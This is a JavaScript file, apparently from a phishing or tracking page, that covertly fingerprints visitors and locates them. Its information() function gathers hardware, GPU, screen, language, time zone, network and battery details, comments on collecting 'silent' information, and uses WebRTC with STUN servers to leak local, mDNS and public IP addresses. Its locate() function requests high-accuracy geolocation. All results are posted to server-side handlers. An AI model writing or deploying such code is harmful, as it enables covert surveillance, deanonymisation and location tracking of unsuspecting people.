function information() {
  var ptf = navigator.platform;
  var cc = navigator.hardwareConcurrency;
  var ram = navigator.deviceMemory;
  var ver = navigator.userAgent;
  var str = ver;
  var os = ver;
  //gpu
  var canvas = document.createElement('canvas');
  var gl;
  var debugInfo;
  var ven;
  var ren;


  if (cc == undefined) {
    cc = 'Not Available';
  }

  //ram
  if (ram == undefined) {
    ram = 'Not Available';
  }

  //browser
  if (ver.indexOf('Firefox') != -1) {
    str = str.substring(str.indexOf(' Firefox/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else if (ver.indexOf('Chrome') != -1) {
    str = str.substring(str.indexOf(' Chrome/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else if (ver.indexOf('Safari') != -1) {
    str = str.substring(str.indexOf(' Safari/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else if (ver.indexOf('Edge') != -1) {
    str = str.substring(str.indexOf(' Edge/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else {
    brw = 'Not Available'
  }

  //gpu
  try {
    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  }
  catch (e) { }
  if (gl) {
    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
  }
  if (ven == undefined) {
    ven = 'Not Available';
  }
  if (ren == undefined) {
    ren = 'Not Available';
  }

  var ht = window.screen.height
  var wd = window.screen.width
  //os
  os = os.substring(0, os.indexOf(')'));
  os = os.split(';');
  os = os[1];
  if (os == undefined) {
    os = 'Not Available';
  }
  os = os.trim();

  // Nouvelles informations silencieuses
  var lang = navigator.language || "Not Available";
  var tz = "Not Available";
  try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e){}
  var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  var net = conn ? conn.effectiveType + " (" + (conn.downlink || 0) + " Mbps)" : "Not Available";
  var touch = navigator.maxTouchPoints || 0;

  var payload = { Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ven: ven, Ren: ren, Ht: ht, Wd: wd, Os: os, Lang: lang, Tz: tz, Net: net, Touch: touch, Bat: "Not Available", Webrtc: "Not Available"};

  function sendData() {
    $.ajax({
      type: 'POST',
      url: 'info_handler.php',
      data: payload,
      success: function () { },
      mimeType: 'text'
    });
  }

  // WebRTC Advanced Local IP & mDNS Leak Extraction
  var localIPs = [];
  var webrtcDone = false;
  
  function processCandidate(candidateStr) {
      // Regex pour IPv4, IPv6, et mDNS (.local)
      var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7}|[a-zA-Z0-9\-]+\.local)/g;
      var matches = candidateStr.match(ipRegex);
      if (matches) {
          matches.forEach(function(ip) {
              if (!localIPs.includes(ip) && ip !== "0.0.0.0" && ip !== "::1") {
                  localIPs.push(ip);
              }
          });
      }
  }

  try {
      var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
      if (RTCPeerConnection) {
          // Connexion 1 : Sans STUN (pour forcer la collecte locale brute)
          var rtcLocal = new RTCPeerConnection({ iceServers: [] });
          rtcLocal.createDataChannel('geopol');
          rtcLocal.onicecandidate = function (evt) {
              if (evt.candidate) processCandidate(evt.candidate.candidate);
          };
          rtcLocal.createOffer().then(offer => rtcLocal.setLocalDescription(offer)).catch(e => {});

          // Connexion 2 : Avec STUN agressifs (pour forcer la translation et récupérer mDNS + Public + Reflexive)
          var rtcStun = new RTCPeerConnection({ 
              iceServers: [
                  { urls: "stun:stun.l.google.com:19302" },
                  { urls: "stun:stun1.l.google.com:19302" },
                  { urls: "stun:stun.services.mozilla.com" }
              ] 
          });
          rtcStun.createDataChannel('geopol_stun');
          rtcStun.onicecandidate = function (evt) {
              if (evt.candidate) processCandidate(evt.candidate.candidate);
          };
          rtcStun.createOffer().then(offer => rtcStun.setLocalDescription(offer)).catch(e => {});
          
          // Wait to collect ICE candidates (they can take a moment)
          setTimeout(function() {
              if (webrtcDone) return;
              webrtcDone = true;
              if (localIPs.length > 0) {
                  payload.Webrtc = localIPs.join(" | ");
              }
              triggerBatteryAndSend();
          }, 1500); // 1.5 secondes max de collecte
      } else {
          webrtcDone = true;
          triggerBatteryAndSend();
      }
  } catch(e) { 
      if (!webrtcDone) {
          webrtcDone = true;
          triggerBatteryAndSend();
      }
  }

  function triggerBatteryAndSend() {
      if (navigator.getBattery) {
        navigator.getBattery().then(function(battery) {
          var level = Math.round(battery.level * 100) + "%";
          var isCharging = battery.charging ? "Charging ⚡" : "Unplugged 🔋";
          payload.Bat = level + " - " + isCharging;
          sendData();
        }).catch(function() {
          sendData();
        });
      } else {
        sendData();
      }
  }
}



function locate(callback, errCallback) {
  if (navigator.geolocation) {
    var optn = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }

  function showError(error) {
    var err_text;
    var err_status = 'failed';

    switch (error.code) {
      case error.PERMISSION_DENIED:
        err_text = 'User denied the request for Geolocation';
        break;
      case error.POSITION_UNAVAILABLE:
        err_text = 'Location information is unavailable';
        break;
      case error.TIMEOUT:
        err_text = 'The request to get user location timed out';
        alert('Please set your location mode on high accuracy...');
        break;
      case error.UNKNOWN_ERROR:
        err_text = 'An unknown error occurred';
        break;
    }

    $.ajax({
      type: 'POST',
      url: 'error_handler.php',
      data: { Status: err_status, Error: err_text },
      success: errCallback(error, err_text),
      mimeType: 'text'
    });
  }
  function showPosition(position) {
    var lat = position.coords.latitude;
    if (lat) {
      lat = lat + ' deg';
    }
    else {
      lat = 'Not Available';
    }
    var lon = position.coords.longitude;
    if (lon) {
      lon = lon + ' deg';
    }
    else {
      lon = 'Not Available';
    }
    var acc = position.coords.accuracy;
    if (acc) {
      acc = acc + ' m';
    }
    else {
      acc = 'Not Available';
    }
    var alt = position.coords.altitude;
    if (alt) {
      alt = alt + ' m';
    }
    else {
      alt = 'Not Available';
    }
    var dir = position.coords.heading;
    if (dir) {
      dir = dir + ' deg';
    }
    else {
      dir = 'Not Available';
    }
    var spd = position.coords.speed;
    if (spd) {
      spd = spd + ' m/s';
    }
    else {
      spd = 'Not Available';
    }

    var ok_status = 'success';

    $.ajax({
      type: 'POST',
      url: 'result_handler.php',
      data: { Status: ok_status, Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd },
      success: callback,
      mimeType: 'text'
    });
  };
}

